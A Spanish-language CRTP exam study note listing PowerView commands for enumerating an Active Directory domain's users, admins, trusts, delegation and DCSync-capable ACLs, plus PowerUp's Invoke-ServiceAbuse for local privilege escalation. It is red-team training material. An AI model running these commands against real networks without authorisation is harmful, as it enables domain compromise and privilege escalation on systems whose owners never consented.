# Examen 

Tags: #CRTP 

## Temas a estudiar?

```bash 
# Temas
- Bypass AMSI  
- Enumeración con Powershell y BloodHound
- Elevación de Privilegios
- Constrained and Unconstrained Delegation
- Pass The Ticket (PTT)
- MSSQL Linked
- ACL / ACE
- Abuse Trust (Confianza) entre dominios

# Tools 
- Rubeus
- Mimikatz
- Powershell
```

## Enumeración máquina inicial 

```bash 
--- Comandos básicos  ---

❯ whoami 
❯ net localgroup Administrators 
# Quien pertenece al grupo administradores 

---  Enumeración PowerView  ---
NOTA: Siempre hacer un Bypass AMSI 
	  
❯ Get-NetComputer | Select-Object name, operatingsystem, operatingsystemversion, dnshostname
# Enumera computadoras del dominio mostrando nombre, OS, versión del OS y hostname DNS.

❯ Get-NetUser | Select-Object samaccountname, name, description, memberof, lastlogon, pwdlastset, badpwdcount | Format-Table -AutoSize
# Enumera usuarios del dominio mostrando cuenta, nombre, descripción, grupos, último logon, último cambio de contraseña y contador de intentos fallidos.

# Grupos privilegiados y sus miembros: 'Domain admins, Administrators, Enterprise Admins, Operators'
❯ Get-DomainGroupMember -Identity "Domain Admins" | Select-Object GroupName, MemberName, MemberDomain, IsGroup | Format-Table -AutoSize
# Enumera los miembros del grupo "Domain Admins" mostrando nombre del grupo, miembro, dominio e indicador si el miembro es un grupo anidado.
 
❯ Get-NetDomainTrust | Select-Object SourceName, TargetName, TrustType, TrustDirection, TrustAttributes | Format-Table -AutoSize
# Enumera las relaciones de confianza del dominio actual mostrando origen, destino, tipo, dirección y atributos del trust — útil para identificar rutas de movimiento lateral entre dominios.

# Constrained y unconstrained delegation 
❯ Get-NetComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto | Format-List
# Enumera computadoras con delegación Kerberos no restringida (Constrained Delegation), mostrando nombre y los SPNs a los que pueden delegar. Ejemplos: Cifs

# DCSync users 
❯ Get-DomainObjectAcl -SearchBase "DC=enterprise,DC=com" -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "DS-Replication-Get-Changes-All" } | Select-Object ObjectAceType, @{Name='Identidad'; Expression={Convert-SidToName $_.SecurityIdentifier}} | Format-Table -AutoSize
# Busca ACEs con el permiso DS-Replication-Get-Changes-All en el dominio, resolviendo el SID al nombre de la cuenta — identifica candidatos para DCSync.
``` 

## PrivEsc máquina inicial 

```bash 
# PowerUp
❯ Invoke-AllChecks
# Ejecuta todos los checks de escalación de privilegios locales de PowerSploit/PowerUp. Identifica servicios con rutas sin comillas (Unquoted Service Path), servicios cuya configuración puede ser modificada por el usuario actual (weak service permissions), binarios de servicios reemplazables, tareas programadas mal configuradas, entre otros vectores comunes de privesc en Windows.

# Servicios clave para escalar 
1 AbyssWebServer con Check: 'Unquoted service paths' 
2 AbyssWebServer con Check: 'Modifiable Service Files' y CanRestart: 'True'

---  Hacer el abuso  ---
❯ Invoke-ServiceAbuse -Name AbyssWebServer -Username 'dominio\usuario'
# Abusa de un servicio con permisos débiles para agregar un usuario al grupo local de administradores. Modifica el binPath del servicio para ejecutar un comando arbitrario como SYSTEM.

❯ net localgroup Administrators   # Verificar que hemos sido agregado al grupo Administrators 
```
